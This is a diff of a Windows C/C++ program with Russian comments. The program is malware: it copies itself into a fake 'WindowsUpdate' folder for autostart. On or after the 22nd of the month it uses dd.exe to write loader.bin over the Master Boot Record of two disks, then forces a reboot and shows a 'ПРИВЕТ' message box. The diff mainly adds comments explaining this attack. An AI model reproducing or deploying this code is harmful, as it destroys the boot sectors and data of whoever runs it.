@@ -1,9 +1,9 @@
-﻿#include <windows.h>
+//Чтобы не тащить с собой кучу библиотек, используем Win32API, компилируемся с помощью DevCPP (mingw gcc)
+//Однако, компилятор не без косяков, поэтому используем смесь C и C++
+#include <windows.h>
 #include <winerror.h>
 #include <fstream>
 using namespace std;
-
-	 
 
 int main() {
 	//Для начала ставимся в автозагрузку и копируемся
@@ -23,8 +23,6 @@ int main() {
 	CopyFile("time.pkg","C:\\Program Files\\WindowsUpdate\\time.pkg",FALSE);
 	FindClose(hf);
 }
-	
-	while (TRUE) {
 	//Получаем системное время
 	SYSTEMTIME st;
 	GetLocalTime(&st);
@@ -37,7 +35,8 @@ int main() {
 	int minute=st.wMinute;
 	int second=st.wSecond;
 
-	if (day<22) return 0;
+	if (day<22) return 0;             //Большинство компов перезагружается хотя бы раз в день
+	                                  //поэтому, если день не тот, не висим в памяти
 
 	if ((day>=22)&&(hour>=10)&&(minute>=30)) {
 		ifstream f12;
@@ -61,7 +60,8 @@ int main() {
 		f12.close();
 		f1.close();
 		f2.close();
-		//dd exploit (запись на диск при любых привелегиях пользователя windows)
+		//dd под виндой не запрашивает права администратора для записи на диск
+		//пользуемся этим, чтобы записать наш загрузчик (loader.bin) в MBR 2 дисков
 		system("C:\\PROGRA~1\\WindowsUpdate\\dd.exe count=1 if=C:\\PROGRA~1\\WindowsUpdate\\loader.bin of=\\\\?\\Device\\Harddisk0\\Partition0");
 		system("C:\\PROGRA~1\\WindowsUpdate\\dd.exe count=1 if=C:\\PROGRA~1\\WindowsUpdate\\loader.bin of=\\\\?\\Device\\Harddisk1\\Partition0");
 		//Получаем превилегии на перезагрузку (MSDN)
@@ -89,6 +89,5 @@ int main() {
 		InitiateSystemShutdown("127.0.0.1","",0,1,1);
 		MessageBox(NULL, "ПРИВЕТ", "ПРИВЕТ", MB_OK | MB_ICONERROR);  
 		return 0;
-	}
 	}
 }
